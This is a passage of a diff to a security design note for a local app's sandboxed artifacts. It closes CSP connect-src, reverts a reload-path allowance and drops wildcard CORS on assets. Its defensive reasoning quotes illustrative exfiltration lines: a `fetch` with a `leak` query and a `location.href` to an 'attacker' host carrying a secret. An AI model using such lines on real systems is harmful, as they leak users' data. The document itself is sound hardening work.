@@ -75,7 +75,7 @@ Content-Security-Policy:
   style-src  'unsafe-inline' http://127.0.0.1:PORT http://localhost:PORT;
   img-src    http://127.0.0.1:PORT http://localhost:PORT data:;
   font-src   http://127.0.0.1:PORT http://localhost:PORT;
-  connect-src http://127.0.0.1:PORT/_gp/reload http://localhost:PORT/_gp/reload;  /* Wave 2a: exact SSE path only */
+  connect-src 'none';            /* Wave 2a keeps this closed — live reload is shell-side */
   object-src 'none'; frame-src 'none'; worker-src 'none';
   base-uri 'none'; form-action 'none';
   frame-ancestors http://127.0.0.1:PORT http://localhost:PORT;
@@ -122,23 +122,30 @@ Notes / open items resolved during Phase 1:
 - `/_gp/v1/*` needs `Access-Control-Allow-Origin: *` (no credentials) for the
   requests that are CORS-gated (modules, fonts, `fetch` of data); classic
   `<script src>`/`<link>` are not.
-- **Wave 2a — `connect-src` widened to the SSE path, not the origin.** Live
-  reload needs the browser to hold an `EventSource`, so `connect-src` moves off
-  `'none'`. It names a **CSP path-source** — exactly `…:PORT/_gp/reload` on both
-  loopback origins — not the bare origin. A bare origin would re-open `/api/*` to
-  a sandboxed artifact (still `Origin: null`, so the control guard blocks writes,
-  but reads/probing should not even be reachable); the exact path keeps everything
-  except live-reload blocked. The trusted shell (its own `connect-src 'self'`)
-  holds the `EventSource` today; the artifact allowance is forward-compat for an
-  in-frame reload client (`bridge.js`, Wave 3b). `test-security.sh` proves a
-  self-host `/api` fetch still violates `connect-src`.
-- **Wave 2a — space assets carry `CSP: sandbox`.** A space's `assets/*` are
-  agent-authored; a hostile `logo.svg`/`.html` opened *top-level* would otherwise
-  execute script on the app origin and reach the control API. Every asset response
-  carries `Content-Security-Policy: sandbox` (null origin, no `allow-scripts`),
-  which applies only when the asset is a *document* — subresource loads
-  (`<script src>`/`<img>`/`<link>`/module/font) are unaffected, so artifacts still
-  use their assets. Combined with `nosniff` this closes the asset-as-document hole.
+- **Wave 2a — `connect-src` stays `'none'`; live reload is shell-side.** Live
+  reload needs the browser to hold an `EventSource`, but the **trusted shell** is
+  the right place for it (its own `connect-src 'self'` already permits same-origin
+  SSE). So the *artifact* `connect-src` stays fully closed at `'none'` — the
+  hostile-content boundary is unchanged from Wave 1. (An earlier iteration widened
+  the artifact `connect-src` to name the exact `/_gp/reload` path for a future
+  in-frame reload client; review flagged it as attack surface with no current
+  consumer — a CSP path-source strips the query string, so `fetch('/_gp/reload?leak=…')`
+  would be a local egress/log channel — so it was reverted. If Wave 3b's `bridge.js`
+  ever needs in-artifact reload, widen to the exact `/_gp/reload` path **and** add
+  a query-rejecting guard; never a bare origin, which would re-open `/api/*`.)
+- **Wave 2a — space assets carry `CSP: sandbox`, no wildcard CORS.** A space's
+  `assets/*` are agent-authored; a hostile `logo.svg`/`.html` opened *top-level*
+  would otherwise execute script on the app origin and reach the control API. Every
+  asset response carries `Content-Security-Policy: sandbox` (null origin, no
+  `allow-scripts`), which applies only when the asset is a *document* — subresource
+  loads (`<script src>`/`<img>`/`<link>`) are unaffected, so artifacts still use
+  their assets. Combined with `nosniff` this closes the asset-as-document hole.
+  Assets carry **no `Access-Control-Allow-Origin`**: a wildcard would let any web
+  page the user has open `fetch()` a space's assets cross-origin (the request
+  carries a legitimate loopback `Host`, so `host_guard` passes) — a real exfil
+  channel. Classic subresources need no CORS; cross-origin fonts/modules/`fetch`
+  from a null-origin artifact are intentionally not enabled (a capability-scoped
+  design would be needed, not a blanket `*`).
 - **Self-navigation is more contained than first thought (Phase-1 finding).**
   Fetch directives don't govern navigation, so the concern was that an artifact
   could `location.href = "http://attacker/?"+secret`. But when the artifact is
